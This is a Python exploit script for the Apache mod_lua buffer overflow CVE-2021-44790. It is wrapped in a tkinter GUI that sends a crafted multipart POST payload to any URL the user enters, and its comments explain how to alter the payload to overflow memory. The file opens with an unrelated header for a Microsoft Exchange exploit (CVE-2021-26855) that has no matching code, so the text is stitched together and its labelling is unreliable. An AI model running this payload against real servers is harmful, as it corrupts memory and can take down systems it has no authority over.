# Exploit Title: Microsoft Exchange 2019 - Unauthenticated Email Download
# Date: 03-11-2021
# Exploit Author: Gonzalo Villegas a.k.a Cl34r
# Vendor Homepage: https://www.microsoft.com/
# Version: OWA Exchange 2013 - 2019
# Tested on: OWA 2016
# CVE : CVE-2021-26855
# Details: checking users mailboxes and automated downloads of emails
# Exploit Title: Apache 2.4.x - Buffer Overflow
# Date: Jan 2 2023
# Exploit Author: Sunil Iyengar
# Vendor Homepage: https://httpd.apache.org/
# Software Link: https://archive.apache.org/dist/httpd/
# Version: Any version less than 2.4.51. Tested on 2.4.50 and 2.4.51
# Tested on: (Server) Kali, (Client) MacOS Monterey
# CVE : CVE-2021-44790


import requests
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
root = tkinter.Tk()
root.title("CVE-2021-44790 exploits")
root.geometry('800x600+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack url : "+inp)
    url = inp
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    #Example "http(s)://<hostname>/process.lua"

    payload = "4\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n0\r\n4\r\n"
    headers = {
      'Content-Type': 'multipart/form-data; boundary=4'
    }

#Note1: The value for boundary=4, in the above example, is arbitrary. It can be anything else like 1.
# But this has to match with the values in Payload.

#Note2: The form data as shown above returns the response as "memory allocation error: block too big".
# But one can change the payload to name=\"name\"\r\n\r\n\r\n4\r\n" and not get the error but on the lua module overflows
# 3 more bytes during memset

    response = requests.request("POST", url, headers=headers, data=payload)
    txtarea.insert(END, "Status Code:")
    txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
    txtarea.insert(END, response.status_code)
    txtarea.insert(END, "\n\n\n")
    txtarea.insert(END, "XML Response:")
    txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
    txtarea.insert(END, response.text)
    txtarea.pack(fill=BOTH, expand=1)
Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()
#Response returned is
#<h3>Error!</h3>
#<pre>memory allocation error: block too big</pre>
